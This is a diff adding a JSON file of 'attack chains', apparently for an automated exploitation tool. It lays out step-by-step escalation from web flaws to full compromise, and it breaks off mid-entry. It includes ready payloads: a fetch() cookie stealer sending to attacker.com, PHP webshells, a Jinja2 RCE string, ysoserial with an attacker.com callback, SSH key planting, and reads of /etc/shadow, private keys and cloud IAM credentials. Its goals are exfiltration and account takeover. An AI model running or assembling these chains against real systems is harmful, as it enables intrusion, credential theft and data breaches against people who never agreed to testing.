@@ -1,0 +1,666 @@
+{
+  "_comment": "Attack Chains: Multi-stage exploitation paths. Each chain links findings into actionable escalation sequences. Edit here — never hardcode in Python. Fields: id (unique), name, description, triggers (keywords), steps (ordered actions with tool_hint and success_criteria), required_findings (must be confirmed), severity, estimated_time, detection_risk, prerequisites, post_exploitation.",
+  "min_severity": 3,
+  "chains": [
+  {
+    "id": "ssrf_cloud_metadata",
+    "name": "SSRF to Cloud Metadata Exfiltration",
+    "description": "Escalate SSRF to cloud metadata exfiltration and IAM credential theft for full cloud account compromise",
+    "triggers": ["ssrf", "server-side request forgery", "redirect", "internal request", "webhook", "fetch url", "metadata", "cloud", "169.254"],
+    "steps": [
+      {"order": 1, "description": "Confirm SSRF with callback to attacker-controlled server (interactsh/collaborator)", "tool_hint": "http_observe", "success_criteria": "DNS/HTTP callback received with target IP"},
+      {"order": 2, "description": "Access AWS IMDSv1 metadata at 169.254.169.254/latest/meta-data/", "tool_hint": "http_observe", "success_criteria": "200 OK with metadata content"},
+      {"order": 3, "description": "Steal IAM credentials from security-credentials/ endpoint", "tool_hint": "http_observe", "success_criteria": "AccessKeyId, SecretAccessKey, Token extracted"},
+      {"order": 4, "description": "Enumerate S3 buckets via aws s3 ls with stolen credentials", "tool_hint": "aws_cli", "success_criteria": "Bucket list obtained"},
+      {"order": 5, "description": "Dump sensitive data from S3 (backups, configs, logs)", "tool_hint": "aws_cli", "success_criteria": "Data exfiltrated"}
+    ],
+    "required_findings": ["ssrf", "cloud"],
+    "severity": "CRITICAL",
+    "estimated_time": "15-30 minutes",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["AWS/GCP/Azure environment", "IMDSv1 enabled or SSRF with redirect"],
+    "post_exploitation": ["Full cloud account compromise", "Data breach from S3/RDS", "Lateral movement via IAM"]
+  },
+  {
+    "id": "sqli_to_rce",
+    "name": "SQL Injection to OS Command Execution",
+    "description": "Escalate SQLi to full RCE via INTO OUTFILE webshell or xp_cmdshell",
+    "triggers": ["sql injection", "sqli", "union select", "mysql", "mssql"],
+    "steps": [
+      {"order": 1, "description": "Confirm SQL injection with UNION-based or error-based technique", "tool_hint": "sqlmap", "success_criteria": "Database banner extracted"},
+      {"order": 2, "description": "Enumerate database schema: tables, columns, users", "tool_hint": "sqlmap", "success_criteria": "Schema map obtained"},
+      {"order": 3, "description": "Check write access: SELECT @@secure_file_priv", "tool_hint": "manual", "success_criteria": "Empty or writable path returned"},
+      {"order": 4, "description": "Write PHP webshell via INTO OUTFILE", "tool_hint": "manual", "success_criteria": "Webshell accessible via HTTP"},
+      {"order": 5, "description": "Execute OS commands via webshell", "tool_hint": "manual", "success_criteria": "id/whoami output returned"}
+    ],
+    "required_findings": ["sql injection", "mysql"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "HIGH",
+    "prerequisites": ["MySQL with FILE privilege", "secure_file_priv allows write", "Web root path known"],
+    "post_exploitation": ["Full server compromise", "Database dump", "Lateral movement"]
+  },
+  {
+    "id": "xss_to_account_takeover",
+    "name": "XSS to Session Hijacking and Account Takeover",
+    "description": "Escalate XSS to cookie theft, session hijacking, and full account takeover",
+    "triggers": ["xss", "cross-site scripting", "script reflected", "dom xss", "script injection", "alert(", "cookie steal", "session hijack"],
+    "steps": [
+      {"order": 1, "description": "Confirm XSS with basic alert(1) payload", "tool_hint": "manual", "success_criteria": "Alert dialog appears"},
+      {"order": 2, "description": "Check for HttpOnly flag on session cookies", "tool_hint": "browser_devtools", "success_criteria": "HttpOnly NOT set"},
+      {"order": 3, "description": "Craft cookie stealer: fetch('https://attacker.com/?c='+document.cookie)", "tool_hint": "manual", "success_criteria": "Cookie received at attacker server"},
+      {"order": 4, "description": "Inject stored XSS in high-traffic page (profile, comment, dashboard)", "tool_hint": "manual", "success_criteria": "XSS triggers on page load for other users"},
+      {"order": 5, "description": "Hijack victim session by injecting stolen cookie", "tool_hint": "browser", "success_criteria": "Logged in as victim"}
+    ],
+    "required_findings": ["xss", "cookie"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["HttpOnly not set", "XSS in persistent/stored location", "Victim visits infected page"],
+    "post_exploitation": ["Account takeover", "PII theft", "Financial fraud"]
+  },
+  {
+    "id": "idor_to_admin_takeover",
+    "name": "IDOR to Admin Account Takeover",
+    "description": "Exploit IDOR to enumerate users, find admin, and take over admin account",
+    "triggers": ["idor", "insecure direct object", "user_id", "account_id", "unauthorized access"],
+    "steps": [
+      {"order": 1, "description": "Confirm horizontal IDOR: change your user_id to adjacent ID", "tool_hint": "manual", "success_criteria": "Other user data returned"},
+      {"order": 2, "description": "Enumerate user IDs sequentially (1, 2, 3... 1000)", "tool_hint": "turbo_intruder", "success_criteria": "Admin user identified (role=admin)"},
+      {"order": 3, "description": "Access admin profile via IDOR: /api/user/{admin_id}", "tool_hint": "manual", "success_criteria": "Admin email, name, settings obtained"},
+      {"order": 4, "description": "Trigger password reset for admin account", "tool_hint": "manual", "success_criteria": "Reset token sent"},
+      {"order": 5, "description": "Intercept reset email via stored XSS or email injection", "tool_hint": "manual", "success_criteria": "Reset token captured"},
+      {"order": 6, "description": "Reset admin password and login", "tool_hint": "manual", "success_criteria": "Admin access confirmed"}
+    ],
+    "required_findings": ["idor", "user"],
+    "severity": "CRITICAL",
+    "estimated_time": "2-4 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Sequential/guessable user IDs", "No rate limiting on password reset", "Email accessible via XSS"],
+    "post_exploitation": ["Full admin access", "User data breach", "Privilege escalation"]
+  },
+  {
+    "id": "file_upload_to_rce",
+    "name": "Unrestricted File Upload to RCE",
+    "description": "Bypass file upload restrictions to plant webshell and achieve RCE",
+    "triggers": ["upload", "file upload", "avatar", "attachment", "import file"],
+    "steps": [
+      {"order": 1, "description": "Test extension filter: upload shell.php, shell.php5, shell.phtml", "tool_hint": "manual", "success_criteria": "File uploaded and accessible"},
+      {"order": 2, "description": "Bypass MIME check: send PHP content with Content-Type: image/jpeg", "tool_hint": "burp", "success_criteria": "Upload accepted"},
+      {"order": 3, "description": "Bypass magic byte: GIF89a; <?php system($_GET['c']); ?>", "tool_hint": "manual", "success_criteria": "File passes signature check"},
+      {"order": 4, "description": "Double extension bypass: shell.php.jpg, shell.png.php", "tool_hint": "manual", "success_criteria": "Apache executes as PHP"},
+      {"order": 5, "description": "Access webshell: /uploads/shell.php?c=id", "tool_hint": "browser", "success_criteria": "Command output returned"}
+    ],
+    "required_findings": ["upload", "webshell"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "HIGH",
+    "prerequisites": ["Upload functionality exists", "Weak/missing validation", "Apache/Nginx misconfiguration"],
+    "post_exploitation": ["Full server compromise", "Data exfiltration", "Pivot to internal network"]
+  },
+  {
+    "id": "lfi_to_rce_via_log_poisoning",
+    "name": "LFI to RCE via Log Poisoning",
+    "description": "Escalate LFI to RCE by poisoning Apache/Nginx logs with PHP payload in User-Agent",
+    "triggers": ["lfi", "path traversal", "include", "file inclusion", "../"],
+    "steps": [
+      {"order": 1, "description": "Confirm LFI: ../../../../etc/passwd returns root:x:0:0", "tool_hint": "manual", "success_criteria": "/etc/passwd content visible"},
+      {"order": 2, "description": "Poison Apache access.log: User-Agent: <?php system($_GET['c']); ?>", "tool_hint": "curl", "success_criteria": "Payload logged in /var/log/apache/access.log"},
+      {"order": 3, "description": "Include poisoned log via LFI: ../../var/log/apache/access.log", "tool_hint": "manual", "success_criteria": "PHP payload executed"},
+      {"order": 4, "description": "Execute commands: ?c=id", "tool_hint": "browser", "success_criteria": "Command output returned"}
+    ],
+    "required_findings": ["lfi", "log"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Apache/Nginx with writable logs", "Log path known", "PHP payload not filtered"],
+    "post_exploitation": ["Full server compromise", "Webshell persistence", "Lateral movement"]
+  },
+  {
+    "id": "jwt_algorithm_confusion",
+    "name": "JWT Algorithm Confusion Attack",
+    "description": "Exploit RS256 to HS256 confusion or alg:none bypass to forge admin JWT",
+    "triggers": ["jwt", "bearer token", "json web token", "eyj", "token"],
+    "steps": [
+      {"order": 1, "description": "Capture JWT from Authorization: Bearer header", "tool_hint": "browser_devtools", "success_criteria": "JWT token obtained"},
+      {"order": 2, "description": "Decode JWT and inspect header: check alg (RS256/HS256)", "tool_hint": "jwt.io", "success_criteria": "Algorithm identified"},
+      {"order": 3, "description": "Test alg:none: change header to {\"alg\":\"none\"}, remove signature", "tool_hint": "jwt_tool", "success_criteria": "Server accepts unsigned token"},
+      {"order": 4, "description": "Test RS256→HS256: sign with public key as HMAC secret", "tool_hint": "jwt_tool", "success_criteria": "Server accepts HS256 token"},
+      {"order": 5, "description": "Forge admin claims: {\"role\":\"admin\",\"isAdmin\":true}", "tool_hint": "jwt_tool", "success_criteria": "Admin access granted"}
+    ],
+    "required_findings": ["jwt", "token"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "LOW",
+    "prerequisites": ["JWT-based auth", "Vulnerable library (node-jose, jose2go)"],
+    "post_exploitation": ["Admin account takeover", "Privilege escalation", "Data breach"]
+  },
+  {
+    "id": "oauth_redirect_bypass",
+    "name": "OAuth Redirect URI Bypass and Token Theft",
+    "description": "Bypass OAuth redirect_uri validation to steal authorization codes and access tokens",
+    "triggers": ["oauth", "openid", "authorize", "redirect_uri", "callback"],
+    "steps": [
+      {"order": 1, "description": "Identify OAuth flow: /authorize?client_id=X&redirect_uri=Y", "tool_hint": "browser_devtools", "success_criteria": "OAuth endpoint found"},
+      {"order": 2, "description": "Test open redirect: redirect_uri=https://attacker.com", "tool_hint": "manual", "success_criteria": "Redirect accepted"},
+      {"order": 3, "description": "Bypass allowlist: https://target.com.attacker.com or https://target.com@attacker.com", "tool_hint": "manual", "success_criteria": "Allowlist bypassed"},
+      {"order": 4, "description": "Craft malicious OAuth URL and send to victim", "tool_hint": "manual", "success_criteria": "Victim clicks link"},
+      {"order": 5, "description": "Capture authorization code from Referer header", "tool_hint": "burp", "success_criteria": "Auth code obtained"},
+      {"order": 6, "description": "Exchange code for access token", "tool_hint": "curl", "success_criteria": "Access token received"}
+    ],
+    "required_findings": ["oauth", "redirect"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["OAuth implementation", "Weak redirect_uri validation"],
+    "post_exploitation": ["Account takeover", "Session hijacking", "API access"]
+  },
+  {
+    "id": "docker_container_breakout",
+    "name": "Docker Container Breakout to Host Compromise",
+    "description": "Escape privileged Docker container to compromise underlying host",
+    "triggers": ["docker", "container", "privileged", "namespace"],
+    "steps": [
+      {"order": 1, "description": "Confirm container access via RCE or exposed Docker socket", "tool_hint": "manual", "success_criteria": "Inside container confirmed"},
+      {"order": 2, "description": "Check for privileged flag: cat /proc/1/status | grep Cap", "tool_hint": "manual", "success_criteria": "CapSysAdmin or Privileged: true"},
+      {"order": 3, "description": "Mount host filesystem: mkdir /host && mount /dev/sda1 /host", "tool_hint": "manual", "success_criteria": "Host FS accessible"},
+      {"order": 4, "description": "Add SSH key to host: echo attacker_key >> /host/root/.ssh/authorized_keys", "tool_hint": "manual", "success_criteria": "SSH key planted"},
+      {"order": 5, "description": "SSH to host with planted key", "tool_hint": "ssh", "success_criteria": "Host access confirmed"}
+    ],
+    "required_findings": ["docker", "container"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "HIGH",
+    "prerequisites": ["Privileged container", "Host device accessible", "No AppArmor/SELinux"],
+    "post_exploitation": ["Full host compromise", "Container escape", "Cluster pivot"]
+  },
+  {
+    "id": "kubernetes_pod_escape",
+    "name": "Kubernetes Pod Escape to Cluster Compromise",
+    "description": "Escape K8s pod via service account token theft and RBAC abuse",
+    "triggers": ["kubernetes", "k8s", "pod", "service account", "rbac"],
+    "steps": [
+      {"order": 1, "description": "Access pod: kubectl exec or RCE via app vulnerability", "tool_hint": "kubectl", "success_criteria": "Inside pod confirmed"},
+      {"order": 2, "description": "Steal service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token", "tool_hint": "manual", "success_criteria": "JWT token obtained"},
+      {"order": 3, "description": "Enumerate RBAC permissions: kubectl auth can-i --list", "tool_hint": "kubectl", "success_criteria": "Permissions list obtained"},
+      {"order": 4, "description": "Create privileged pod or access secrets", "tool_hint": "kubectl", "success_criteria": "Privileged access confirmed"},
+      {"order": 5, "description": "Extract cluster secrets from etcd or Secrets API", "tool_hint": "kubectl", "success_criteria": "Secrets dumped"}
+    ],
+    "required_findings": ["kubernetes", "pod"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-3 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["K8s cluster access", "Over-permissive service account", "RBAC misconfiguration"],
+    "post_exploitation": ["Full cluster compromise", "Secret theft", "Supply chain attack"]
+  },
+  {
+    "id": "ssti_to_full_rce",
+    "name": "SSTI to Full RCE",
+    "description": "Escalate Server-Side Template Injection to OS command execution",
+    "triggers": ["ssti", "template injection", "49 in response", "jinja", "twig", "freemarker"],
+    "steps": [
+      {"order": 1, "description": "Confirm SSTI: {{7*7}} returns 49 in response", "tool_hint": "manual", "success_criteria": "Math evaluated server-side"},
+      {"order": 2, "description": "Identify template engine: probe Jinja2, Twig, Freemarker payloads", "tool_hint": "tplmap", "success_criteria": "Engine identified"},
+      {"order": 3, "description": "Escalate to RCE: Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "tool_hint": "manual", "success_criteria": "Command output returned"},
+      {"order": 4, "description": "Exfiltrate environment variables and secrets", "tool_hint": "manual", "success_criteria": "DB credentials, API keys obtained"}
+    ],
+    "required_findings": ["template", "ssti"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Server-side template rendering", "User input in template context"],
+    "post_exploitation": ["Full server compromise", "Credential theft", "Data exfiltration"]
+  },
+  {
+    "id": "prototype_pollution_to_rce",
+    "name": "Prototype Pollution to RCE",
+    "description": "Exploit JavaScript prototype pollution to achieve RCE via gadget chain",
+    "triggers": ["prototype pollution", "__proto__", "lodash", "merge", "nodejs"],
+    "steps": [
+      {"order": 1, "description": "Confirm prototype pollution: POST {\"__proto__\":{\"isAdmin\":true}}", "tool_hint": "manual", "success_criteria": "Privilege escalation confirmed"},
+      {"order": 2, "description": "Identify merge library: lodash, deepmerge, jQuery extend", "tool_hint": "source_analysis", "success_criteria": "Vulnerable library found"},
+      {"order": 3, "description": "Pollute process.binding or spawnprototype for RCE", "tool_hint": "manual", "success_criteria": "Command execution gadget triggered"},
+      {"order": 4, "description": "Execute OS command via prototype chain", "tool_hint": "manual", "success_criteria": "id/whoami output returned"}
+    ],
+    "required_findings": ["prototype", "nodejs"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["Node.js application", "Deep merge operation", "Gadget chain available"],
+    "post_exploitation": ["Full server compromise", "Supply chain attack", "Data breach"]
+  },
+  {
+    "id": "xxe_to_ssrf_and_file_read",
+    "name": "XXE to SSRF and File Read",
+    "description": "Exploit XXE to read internal files and perform SSRF to internal services",
+    "triggers": ["xxe", "xml external entity", "doctype", "xml injection", "svg upload"],
+    "steps": [
+      {"order": 1, "description": "Confirm XXE: inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "tool_hint": "manual", "success_criteria": "/etc/passwd content returned"},
+      {"order": 2, "description": "Read sensitive files: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa", "tool_hint": "manual", "success_criteria": "Credentials obtained"},
+      {"order": 3, "description": "SSRF via XXE: SYSTEM 'http://169.254.169.254/latest/meta-data/'", "tool_hint": "manual", "success_criteria": "Cloud metadata returned"},
+      {"order": 4, "description": "Internal port scan via XXE: http://192.168.1.1:22, :80, :443", "tool_hint": "manual", "success_criteria": "Internal services enumerated"}
+    ],
+    "required_findings": ["xxe", "xml"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["XML parsing enabled", "External entities not disabled", "DOCTYPE allowed"],
+    "post_exploitation": ["Credential theft", "Internal network mapping", "Cloud account compromise"]
+  },
+  {
+    "id": "graphql_idor_to_data_theft",
+    "name": "GraphQL IDOR to Mass Data Theft",
+    "description": "Exploit GraphQL IDOR via node() query to exfiltrate cross-user data at scale",
+    "triggers": ["graphql", "gql", "introspection", "node(", "apollo"],
+    "steps": [
+      {"order": 1, "description": "Enable introspection: query { __schema { types { name } } }", "tool_hint": "graphql_playground", "success_criteria": "Schema dumped"},
+      {"order": 2, "description": "Identify node() or object query accepting ID parameter", "tool_hint": "introspection", "success_criteria": "Query signature found"},
+      {"order": 3, "description": "Test IDOR: query { node(id: \"gid://User/123\") { ...on User { email role } } }", "tool_hint": "manual", "success_criteria": "Cross-user data returned"},
+      {"order": 4, "description": "Batch enumerate all user IDs via script", "tool_hint": "inql", "success_criteria": "All user data extracted"},
+      {"order": 5, "description": "Exfiltrate sensitive fields: emails, roles, API keys", "tool_hint": "manual", "success_criteria": "Data breach confirmed"}
+    ],
+    "required_findings": ["graphql", "idor"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["GraphQL endpoint", "Introspection enabled", "No authorization on node()"],
+    "post_exploitation": ["Mass data breach", "Credential theft", "PII exposure"]
+  },
+  {
+    "id": "deserialization_to_rce",
+    "name": "Insecure Deserialization to RCE",
+    "description": "Exploit unsafe deserialization to achieve RCE via gadget chains",
+    "triggers": ["deserializ", "pickle", "viewstate", "java.io", "marshal", "phpobject"],
+    "steps": [
+      {"order": 1, "description": "Identify deserialization: base64/rO0AB/PHPserialize in cookie/POST", "tool_hint": "manual", "success_criteria": "Serialized object confirmed"},
+      {"order": 2, "description": "Identify language/framework: Java (rO0AB), PHP (O:8:), Python (pickle)", "tool_hint": "manual", "success_criteria": "Technology identified"},
+      {"order": 3, "description": "Generate gadget payload: ysoserial CommonsCollections5 'nslookup attacker.com'", "tool_hint": "ysoserial", "success_criteria": "DNS callback received"},
+      {"order": 4, "description": "Upgrade to RCE: reverse shell payload", "tool_hint": "ysoserial", "success_criteria": "Shell received"}
+    ],
+    "required_findings": ["deserializ", "java"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-3 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Deserialization endpoint", "Vulnerable library", "Gadget chain available"],
+    "post_exploitation": ["Full server compromise", "Data exfiltration", "Lateral movement"]
+  },
+  {
+    "id": "cache_poison_to_stored_xss",
+    "name": "Cache Poisoning to Stored XSS",
+    "description": "Poison web cache with XSS payload to affect all users visiting cached URL",
+    "triggers": ["cache poisoning", "web cache", "cdn", "varnish", "unkeyed header"],
+    "steps": [
+      {"order": 1, "description": "Identify unkeyed header: X-Forwarded-Host, X-Original-URL", "tool_hint": "param_miner", "success_criteria": "Header reflected but not in cache key"},
+      {"order": 2, "description": "Inject XSS via unkeyed header: X-Forwarded-Host: <script>alert(1)</script>", "tool_hint": "manual", "success_criteria": "XSS reflected in response"},
+      {"order": 3, "description": "Poison cache: send request with unique cachebuster, verify stored", "tool_hint": "manual", "success_criteria": "XSS appears without malicious header"},
+      {"order": 4, "description": "Mass impact: all users visiting cached URL trigger XSS", "tool_hint": "manual", "success_criteria": "Victim session hijacked"}
+    ],
+    "required_findings": ["cache", "xss"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["Web cache (Varnish, CloudFront)", "Unkeyed header reflection", "No Cache-Control on dynamic content"],
+    "post_exploitation": ["Mass session hijacking", "Credential theft", "Malware distribution"]
+  },
+  {
+    "id": "http_smuggling_to_auth_bypass",
+    "name": "HTTP Request Smuggling to Auth Bypass",
+    "description": "Smuggle HTTP request past WAF to access protected admin endpoints",
+    "triggers": ["http smuggling", "request smuggling", "cl.te", "te.cl", "desync"],
+    "steps": [
+      {"order": 1, "description": "Probe for CL.TE: send Content-Length: 6 + Transfer-Encoding: chunked", "tool_hint": "smuggler", "success_criteria": "Request queued (X appears in next response)"},
+      {"order": 2, "description": "Smuggle prefix to admin endpoint: GET /admin HTTP/1.1", "tool_hint": "manual", "success_criteria": "Admin response in subsequent request"},
+      {"order": 3, "description": "Bypass WAF: smuggle malicious request that frontend doesn't see", "tool_hint": "manual", "success_criteria": "WAF bypassed"},
+      {"order": 4, "description": "Access privileged functionality without authentication", "tool_hint": "manual", "success_criteria": "Admin action performed"}
+    ],
+    "required_findings": ["smuggling", "admin"],
+    "severity": "CRITICAL",
+    "estimated_time": "2-4 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["HTTP/1.1 frontend + HTTP/2 backend", "Different HTTP parsers", "WAF in front"],
+    "post_exploitation": ["Auth bypass", "Admin access", "Data breach"]
+  },
+  {
+    "id": "path_traversal_to_credential_theft",
+    "name": "Path Traversal to Credential Theft and Lateral Movement",
+    "description": "Exploit path traversal to read credentials and pivot to internal services",
+    "triggers": ["path traversal", "directory traversal", "lfi", "../", "etc/passwd"],
+    "steps": [
+      {"order": 1, "description": "Confirm LFI: ../../../../etc/passwd returns root:x:0:0", "tool_hint": "manual", "success_criteria": "File content visible"},
+      {"order": 2, "description": "Read application configs: .env, config.php, database.yml", "tool_hint": "manual", "success_criteria": "DB credentials obtained"},
+      {"order": 3, "description": "Read SSH keys: ~/.ssh/id_rsa, /root/.ssh/authorized_keys", "tool_hint": "manual", "success_criteria": "SSH key obtained"},
+      {"order": 4, "description": "SSH to internal server with stolen key", "tool_hint": "ssh", "success_criteria": "Internal access confirmed"}
+    ],
+    "required_findings": ["traversal", "path"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["LFI vulnerability", "Readable credential files", "SSH accessible"],
+    "post_exploitation": ["Credential theft", "Lateral movement", "Internal pivot"]
+  },
+  {
+    "id": "second_order_sqli",
+    "name": "Second-Order SQL Injection via Stored Input",
+    "description": "Store SQLi payload in profile field, triggers when admin queries data",
+    "triggers": ["sql injection", "stored sqli", "second-order", "profile", "username"],
+    "steps": [
+      {"order": 1, "description": "Identify stored input: username, bio, comment, note field", "tool_hint": "manual", "success_criteria": "Input persisted in database"},
+      {"order": 2, "description": "Store SQLi payload: admin' UNION SELECT password FROM users--", "tool_hint": "manual", "success_criteria": "Payload stored without error"},
+      {"order": 3, "description": "Trigger execution: admin views profile/search results", "tool_hint": "manual", "success_criteria": "SQL error or data leakage"},
+      {"order": 4, "description": "Extract sensitive data via second-order injection", "tool_hint": "manual", "success_criteria": "Passwords/emails dumped"}
+    ],
+    "required_findings": ["sql injection", "stored"],
+    "severity": "HIGH",
+    "estimated_time": "2-4 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["Stored user input", "Admin panel queries stored data", "No output encoding"],
+    "post_exploitation": ["Data breach", "Credential theft", "Admin compromise"]
+  },
+  {
+    "id": "mass_assignment_to_admin_takeover",
+    "name": "Mass Assignment to Admin Takeover",
+    "description": "Exploit mass assignment to grant admin role without authorization",
+    "triggers": ["mass assignment", "auto-binding", "role", "admin", "is_admin"],
+    "steps": [
+      {"order": 1, "description": "Identify mass assignment: PUT /api/profile with extra fields", "tool_hint": "manual", "success_criteria": "Extra fields accepted"},
+      {"order": 2, "description": "Add role=admin: {\"role\":\"admin\",\"isStaff\":true}", "tool_hint": "manual", "success_criteria": "Response includes admin role"},
+      {"order": 3, "description": "Verify admin access: access /admin panel", "tool_hint": "browser", "success_criteria": "Admin panel accessible"},
+      {"order": 4, "description": "Escalate privileges: create users, delete data, export DB", "tool_hint": "manual", "success_criteria": "Full admin control"}
+    ],
+    "required_findings": ["mass assignment", "admin"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "LOW",
+    "prerequisites": ["Auto-binding framework (Laravel, Rails, ASP.NET)", "No strong type validation"],
+    "post_exploitation": ["Full admin access", "Data manipulation", "User creation"]
+  },
+  {
+    "id": "api_key_leak_to_account_takeover",
+    "name": "API Key Leakage to Full Account Takeover",
+    "description": "Exploit leaked API key in JS/response to impersonate service account",
+    "triggers": ["api_key", "apikey", "x-api-key", "secret", "token exposed"],
+    "steps": [
+      {"order": 1, "description": "Find API key: grep JS files for api_key, secret, token", "tool_hint": "subjs + grep", "success_criteria": "Key found in main.js"},
+      {"order": 2, "description": "Test key: use in Authorization header for API call", "tool_hint": "curl", "success_criteria": "API responds with data"},
+      {"order": 3, "description": "Enumerate permissions: what endpoints accept this key?", "tool_hint": "manual", "success_criteria": "Scope determined"},
+      {"order": 4, "description": "Access all data: users, orders, payments via API", "tool_hint": "curl", "success_criteria": "Full data breach"}
+    ],
+    "required_findings": ["api_key", "apikey"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "LOW",
+    "prerequisites": ["API key in client-side code", "No IP/domain restriction", "Over-permissive scope"],
+    "post_exploitation": ["Full API access", "Data breach", "Service impersonation"]
+  },
+  {
+    "id": "spring_actuator_to_jmx_rce",
+    "name": "Spring Boot Actuator to JMX RCE",
+    "description": "Exploit exposed Spring Boot Actuator to achieve RCE via JMX endpoint",
+    "triggers": ["spring boot", "actuator", "jolokia", "jmx", "/actuator"],
+    "steps": [
+      {"order": 1, "description": "Enumerate actuator endpoints: GET /actuator, /actuator/jolokia", "tool_hint": "manual", "success_criteria": "Jolokia endpoint accessible"},
+      {"order": 2, "description": "List MBeans: GET /actuator/jolokia/list", "tool_hint": "manual", "success_criteria": "MBean list obtained"},
+      {"order": 3, "description": "Execute via MBeanServer: createMBean with malicious class", "tool_hint": "manual", "success_criteria": "Command executed"},
+      {"order": 4, "description": "Alternative: invoke Logback JNDI injection", "tool_hint": "manual", "success_criteria": "RCE confirmed"}
+    ],
+    "required_findings": ["actuator", "spring"],
+    "severity": "CRITICAL",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Spring Boot Actuator exposed", "Jolokia endpoint accessible", "No auth on /actuator"],
+    "post_exploitation": ["Full server compromise", "Data exfiltration", "Lateral movement"]
+  },
+  {
+    "id": "cors_misconfig_to_session_theft",
+    "name": "CORS Misconfiguration to Session Token Theft",
+    "description": "Exploit CORS with credentials to steal session tokens via cross-origin XHR",
+    "triggers": ["cors", "access-control", "cross-origin", "credentials"],
+    "steps": [
+      {"order": 1, "description": "Test CORS: send Origin: https://evil.com, check Access-Control-Allow-Origin", "tool_hint": "manual", "success_criteria": "Origin reflected with Credentials: true"},
+      {"order": 2, "description": "Craft malicious page: XHR to /api/user with credentials:include", "tool_hint": "manual", "success_criteria": "Response readable via JS"},
+      {"order": 3, "description": "Host phishing page, send to victim", "tool_hint": "manual", "success_criteria": "Victim visits page"},
+      {"order": 4, "description": "Steal session token from response JSON", "tool_hint": "javascript", "success_criteria": "Token exfiltrated"}
+    ],
+    "required_findings": ["cors", "session"],
+    "severity": "HIGH",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["CORS with wildcard/regex origin", "credentials allowed", "Session in response body"],
+    "post_exploitation": ["Session hijacking", "Account takeover", "API abuse"]
+  },
+  {
+    "id": "subdomain_takeover_to_cookie_theft",
+    "name": "Subdomain Takeover to Cookie Theft",
+    "description": "Claim dangling subdomain CNAME to steal parent domain cookies",
+    "triggers": ["subdomain takeover", "cname", "dangling", "s3", "github pages"],
+    "steps": [
+      {"order": 1, "description": "Find dangling CNAME: shop.target.com → shops.myshopify.com (404)", "tool_hint": "subzy", "success_criteria": "Claimable subdomain found"},
+      {"order": 2, "description": "Register and claim subdomain on provider (Shopify, S3, GitHub)", "tool_hint": "manual", "success_criteria": "Subdomain under attacker control"},
+      {"order": 3, "description": "Set cookie on *.target.com via malicious JS", "tool_hint": "javascript", "success_criteria": "Cookie set on parent domain"},
+      {"order": 4, "description": "Steal session when victim visits main domain", "tool_hint": "javascript", "success_criteria": "Session cookie captured"}
+    ],
+    "required_findings": ["subdomain", "cname"],
+    "severity": "HIGH",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["Dangling CNAME", "Cookie scope includes subdomain", "No HttpOnly"],
+    "post_exploitation": ["Session hijacking", "Phishing from trusted subdomain", "Brand abuse"]
+  },
+  {
+    "id": "ssrf_to_redis_rce",
+    "name": "SSRF to Redis RCE via Gopher",
+    "description": "Exploit SSRF with gopher:// to execute Redis commands and write webshell",
+    "triggers": ["ssrf", "redis", "gopher", "internal service"],
+    "steps": [
+      {"order": 1, "description": "Confirm SSRF: callback to attacker DNS", "tool_hint": "interactsh", "success_criteria": "DNS received"},
+      {"order": 2, "description": "Probe internal Redis: gopher://127.0.0.1:6379/_PING", "tool_hint": "manual", "success_criteria": "+PONG response"},
+      {"order": 3, "description": "Write webshell: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html", "tool_hint": "manual", "success_criteria": "Webshell written"},
+      {"order": 4, "description": "Access webshell via HTTP", "tool_hint": "browser", "success_criteria": "RCE confirmed"}
+    ],
+    "required_findings": ["ssrf", "redis"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["SSRF with gopher/dict scheme", "Redis on localhost:6379", "Writable web root"],
+    "post_exploitation": ["Full server compromise", "Webshell persistence", "Data theft"]
+  },
+  {
+    "id": "default_creds_to_internal_pivot",
